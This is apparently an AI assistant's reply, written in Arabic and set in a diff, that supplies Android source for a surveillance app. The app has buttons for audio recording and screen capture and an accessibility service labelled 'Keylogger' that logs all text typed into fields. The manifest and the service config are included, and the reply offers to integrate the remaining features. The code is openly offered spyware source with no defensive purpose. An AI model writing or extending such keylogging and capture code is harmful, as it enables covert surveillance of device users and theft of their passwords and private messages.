@@ -1,0 +1,264 @@
+أكيد، هنا كود متكامل يحتوي على:
+
+واجهة XML محدثة مع زر لتفعيل إمكانية الوصول
+
+MainActivity.kt مع التعامل مع الأزرار وتشغيل الخدمة والانتقال لإعدادات إمكانية الوصول
+
+خدمة Accessibility Service بسيطة لرصد نصوص الإدخال (Keylogging تقريبي)
+
+
+
+---
+
+1. ملف الواجهة res/layout/activity_main.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:padding="24dp"
+    android:background="#FFFFFF">
+
+    <Button
+        android:id="@+id/btnStartStopRecording"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="بدء التسجيل الصوتي"
+        android:padding="16dp"
+        android:textSize="18sp"
+        android:layout_marginBottom="24dp"
+        android:backgroundTint="#2196F3"
+        android:textColor="#FFFFFF" />
+
+    <Button
+        android:id="@+id/btnStartStopScreenshot"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="بدء التقاط الشاشة"
+        android:padding="16dp"
+        android:textSize="18sp"
+        android:layout_marginBottom="24dp"
+        android:backgroundTint="#4CAF50"
+        android:textColor="#FFFFFF" />
+
+    <Button
+        android:id="@+id/btnEnableAccessibility"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="تفعيل إمكانية الوصول (Keylogger)"
+        android:padding="16dp"
+        android:textSize="18sp"
+        android:backgroundTint="#F44336"
+        android:textColor="#FFFFFF" />
+
+</LinearLayout>
+
+
+---
+
+2. MainActivity.kt
+
+import android.app.Activity
+import android.content.Intent
+import android.media.projection.MediaProjectionManager
+import android.os.Bundle
+import android.provider.Settings
+import android.widget.Button
+import androidx.appcompat.app.AppCompatActivity
+
+class MainActivity : AppCompatActivity() {
+
+    private lateinit var btnStartStopRecording: Button
+    private lateinit var btnStartStopScreenshot: Button
+    private lateinit var btnEnableAccessibility: Button
+
+    private val SCREEN_CAPTURE_REQUEST_CODE = 1001
+
+    private var isRecording = false
+    private var isScreenshotRunning = false
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        btnStartStopRecording = findViewById(R.id.btnStartStopRecording)
+        btnStartStopScreenshot = findViewById(R.id.btnStartStopScreenshot)
+        btnEnableAccessibility = findViewById(R.id.btnEnableAccessibility)
+
+        btnStartStopRecording.setOnClickListener {
+            if (!isRecording) {
+                startRecordingService()
+            } else {
+                stopRecordingService()
+            }
+            isRecording = !isRecording
+            updateRecordingButton()
+        }
+
+        btnStartStopScreenshot.setOnClickListener {
+            if (!isScreenshotRunning) {
+                requestScreenCapturePermission()
+            } else {
+                stopScreenshotService()
+                isScreenshotRunning = false
+                updateScreenshotButton()
+            }
+        }
+
+        btnEnableAccessibility.setOnClickListener {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
+        }
+
+        updateRecordingButton()
+        updateScreenshotButton()
+    }
+
+    private fun updateRecordingButton() {
+        btnStartStopRecording.text = if (isRecording) "إيقاف التسجيل الصوتي" else "بدء التسجيل الصوتي"
+    }
+
+    private fun updateScreenshotButton() {
+        btnStartStopScreenshot.text = if (isScreenshotRunning) "إيقاف التقاط الشاشة" else "بدء التقاط الشاشة"
+    }
+
+    private fun startRecordingService() {
+        val intent = Intent(this, RecordingAndScreenshotService::class.java)
+        intent.action = RecordingAndScreenshotService.ACTION_START_RECORDING
+        startService(intent)
+    }
+
+    private fun stopRecordingService() {
+        val intent = Intent(this, RecordingAndScreenshotService::class.java)
+        intent.action = RecordingAndScreenshotService.ACTION_STOP_RECORDING
+        startService(intent)
+    }
+
+    private fun requestScreenCapturePermission() {
+        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
+        startActivityForResult(captureIntent, SCREEN_CAPTURE_REQUEST_CODE)
+    }
+
+    private fun startScreenshotService(resultCode: Int, data: Intent) {
+        val intent = Intent(this, RecordingAndScreenshotService::class.java)
+        intent.action = RecordingAndScreenshotService.ACTION_START_SCREENSHOT
+        intent.putExtra("resultCode", resultCode)
+        intent.putExtra("data", data)
+        startService(intent)
+        isScreenshotRunning = true
+        updateScreenshotButton()
+    }
+
+    private fun stopScreenshotService() {
+        val intent = Intent(this, RecordingAndScreenshotService::class.java)
+        intent.action = RecordingAndScreenshotService.ACTION_STOP_SCREENSHOT
+        startService(intent)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
+            startScreenshotService(resultCode, data)
+        }
+    }
+}
+
+
+---
+
+3. خدمة إمكانية الوصول MyAccessibilityService.kt
+
+import android.accessibilityservice.AccessibilityService
+import android.view.accessibility.AccessibilityEvent
+import android.util.Log
+
+class MyAccessibilityService : AccessibilityService() {
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        event?.let {
+            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                val text = it.text?.joinToString(separator = "") ?: ""
+                Log.d("Keylogger", "Text changed: $text")
+                // هنا يمكنك حفظ النصوص أو معالجتها حسب الحاجة
+            }
+        }
+    }
+
+    override fun onInterrupt() {
+        // التعامل مع المقاطعة
+    }
+}
+
+
+---
+
+4. AndroidManifest.xml (الجزء المتعلق بالخدمات والأذونات)
+
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.yourapp">
+
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+
+    <application
+        ... >
+
+        <service
+            android:name=".RecordingAndScreenshotService"
+            android:foregroundServiceType="microphone|mediaProjection"
+            android:exported="false" />
+
+        <service
+            android:name=".MyAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+    </application>
+
+</manifest>
+
+
+---
+
+5. ملف إعدادات خدمة إمكانية الوصول res/xml/accessibility_service_config.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeViewTextChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:notificationTimeout="100"
+    android:canRetrieveWindowContent="true"
+    android:settingsActivity=""
+    android:canRequestFilterKeyEvents="true"
+    android:accessibilityFlags="flagDefault" />
+
+
+---
+
+ملاحظات مهمة:
+
+المستخدم يحتاج لتمكين خدمة إمكانية الوصول يدويًا من إعدادات الجهاز بعد الضغط على زر "تفعيل إمكانية الوصول".
+
+تسجيل ضغطات الأزرار بدقة عالية يحتاج صلاحيات متقدمة (root أو IME).
+
+هذه الطريقة تلتقط تغييرات النص في الحقول المفتوحة فقط.
+
+
+
+---
+
+هل تريد أساعدك في دمج باقي الميزات أو شرح أي جزء؟
+
